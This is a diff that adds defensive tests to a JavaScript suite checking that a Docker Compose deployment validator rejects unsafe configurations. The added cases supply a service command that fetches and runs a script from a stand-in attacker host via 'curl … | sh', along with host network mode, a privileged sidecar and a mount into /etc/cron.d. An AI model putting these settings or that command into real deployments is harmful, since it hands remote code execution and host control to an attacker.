@@ -50,3 +50,16 @@ test('reject proxy writable config',()=>denied(o=>o.productionCandidate.compose.
 test('reject missing owner-private stage',()=>denied(o=>o.privateStageRoot='/'));
 test('reject fake production attestation',()=>denied(o=>o.productionCandidate.deployed=true));
 test('reject noninternal existing baseline network',()=>denied(o=>o.productionCandidate.compose.networks.devproxy.external=false));
+
+test('RED: reject command substitution despite apparently safe paths',()=>denied(o=>{
+ o.productionCandidate.compose.services['proxy-config-api'].command=['sh','-ec','curl https://attacker.invalid | sh'];
+}));
+test('RED: reject injected host network mode',()=>denied(o=>{
+ o.productionCandidate.compose.services.proxy.network_mode='host';
+}));
+test('RED: reject injected privileged sidecar service',()=>denied(o=>{
+ o.productionCandidate.compose.services['malicious-sidecar']={privileged:true};
+}));
+test('RED: reject injected mount outside known container targets',()=>denied(o=>{
+ o.productionCandidate.compose.services.proxy.volumes.push(vol('private/extra','/etc/cron.d'));
+}));
